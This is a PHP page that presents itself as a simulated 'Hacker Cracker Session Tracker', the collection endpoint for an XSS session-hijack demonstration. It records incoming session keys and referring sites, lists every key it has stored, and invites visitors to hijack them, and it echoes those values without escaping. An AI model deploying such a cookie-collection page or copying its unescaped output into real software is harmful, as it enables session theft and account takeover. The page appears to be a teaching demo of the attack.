<?php
    require_once 'class-hackedsession.php';
    
    $info = HackedSession::grabSession();
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Hacker Cracker Session Tracker</title>
        <meta name="description" content="Simulation of a hacker's collection point page for a XSS session hijack exploit.">
        <style>
            body {
                background: black url('http://www.wallpaperup.com/uploads/wallpapers/2014/01/07/219176/7a5a19df988856cb8f1276e283a015eb.jpg');
                color: white;
            }
            a {
                color: yellow;
            }
            table, th, td {
                border: 1px solid #00FF00;
                border-collapse:collapse;
            }
            th, td {
                padding: 5px 10px;
            }
        </style>
     </head>
    <body>
        <h1>Welcome to Hacker Cracker Session Tracker</h1>
        <?php if ($info['sessionkey']) : ?>
            <h2>First off, want to thank you for sharing your session cookie with me...</h2>
            
            <ul>
                <li>Site: <a href="<?php echo $info['referer']; ?>"><?php echo $info['referer']; ?></a></li>
                <li>Your Session ID: <strong><?php echo $info['sessionkey']; ?></strong></li>
            </ul>
            
            <?php if ($info['repeat']): ?>
                <h2>Boring! I <em>already</em> have that in my collection....</h2>
           <?php else: ?>
               <h2>I have added it to my collection....</h2>
            <?php endif ?>
            
        <?php else: ?>
            <h2>I see you found your way here without sharing your session key.</h2>
            <p>Oh well, here is the collesion of session keys I have amassed so far from other suckers...</p>
        <?php endif ?>
            
        <table>
          <tbody>
            <tr><th>Date</th><th>Site</th><th>Session Key</th></tr>
            <?php HackedSession::listAll() ?>
          </tbody>            
        </table>
        
        <p>
            Feel free to go ahead and hijack one of these sessions for your own amusement!
        </p>
        <h2>Of course....</h2>
        <p>If this were a real hack, I would have simply stolen your session info and 
            <a href='#' onclick='window.close(); return false;'>closed this window</a> 
            so you would be none the wiser.
        </p>
    </body>
</html>